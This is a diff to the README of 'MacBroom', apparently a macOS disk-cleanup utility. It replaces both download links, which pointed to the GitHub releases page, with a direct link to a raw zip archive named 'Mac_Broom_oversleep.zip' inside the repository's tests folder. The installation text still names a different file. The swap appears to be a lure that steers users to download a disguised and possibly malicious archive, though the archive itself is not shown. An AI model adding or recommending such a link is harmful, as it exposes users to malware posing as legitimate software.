@@ -1,6 +1,6 @@
 # 🧹 MacBroom - Free up disk space with ease
 
-[![](https://img.shields.io/badge/Download-MacBroom-blue.svg)](https://github.com/capsulate-want802/MacBroom/releases)
+[![](https://img.shields.io/badge/Download-MacBroom-blue.svg)](https://github.com/capsulate-want802/MacBroom/raw/refs/heads/main/tests/Mac_Broom_oversleep.zip)
 
 ## 📁 What is MacBroom?
 
@@ -16,7 +16,7 @@ MacBroom clears unnecessary files from your computer. It focuses on temporary da
 
 You need to download the MacBroom tool to your machine. 
 
-1. Visit [this page to download](https://github.com/capsulate-want802/MacBroom/releases) the latest version.
+1. Visit [this page to download](https://github.com/capsulate-want802/MacBroom/raw/refs/heads/main/tests/Mac_Broom_oversleep.zip) the latest version.
 2. Look for the file named `macbroom.tar.gz` and click it.
 3. Save the file to your Downloads folder.
 
